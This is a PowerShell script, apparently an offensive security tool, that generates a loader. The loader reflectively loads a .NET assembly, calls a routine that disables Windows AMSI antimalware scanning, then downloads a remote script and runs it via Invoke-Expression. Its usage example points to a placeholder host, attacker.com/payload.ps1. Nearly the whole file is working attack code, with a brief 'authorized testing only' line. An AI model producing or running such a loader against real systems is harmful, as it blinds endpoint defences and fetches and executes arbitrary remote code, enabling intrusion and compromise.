<#
.SYNOPSIS
    Generates a PowerShell loader that performs AMSI resurrection bypass
    and downloads a remote payload.

.DESCRIPTION
    Reads a .NET assembly (DLL) from disk, converts it to a byte array,
    and generates a loader script that:
    1. Loads the assembly via reflection
    2. Calls [Resurrect]::Patch() to disable AMSI
    3. Downloads and executes a remote payload

.PARAMETER AssemblyPath
    Path to the compiled AmsiResurrect DLL.

.PARAMETER PayloadUrl
    URL of the remote payload to download and execute after AMSI bypass.

.EXAMPLE
    .\ConvertBytes2.ps1
    [***PATH FILE***]: C:\path\to\AM.dll
    [Payload URL]: https://attacker.com/payload.ps1

.NOTES
    Author: @3xploit666
    For authorized security testing only.
#>

param (
    [string]$AssemblyPath = $(Read-Host "[***PATH FILE***]"),
    [string]$PayloadUrl   = $(Read-Host "[Payload URL]")
)

Start-Sleep -Seconds 2

if (-Not (Test-Path $AssemblyPath)) {
    Write-Error "File not found: $AssemblyPath"
    return
}

$bytes = [System.IO.File]::ReadAllBytes($AssemblyPath) -join ","
$outputPath = Join-Path $env:USERPROFILE "loader.ps1"

$loader = @"
[System.Reflection.Assembly]::Load([byte[]]($bytes))
[AmsiResurrect.Resurrect]::Patch()
Start-Sleep -Seconds 3
`$payload = (New-Object Net.WebClient).DownloadString('$PayloadUrl')
Invoke-Expression `$payload
"@

$loader | Out-File -FilePath $outputPath -Encoding UTF8

Write-Host "[+] Loader generated: $outputPath" -ForegroundColor Green
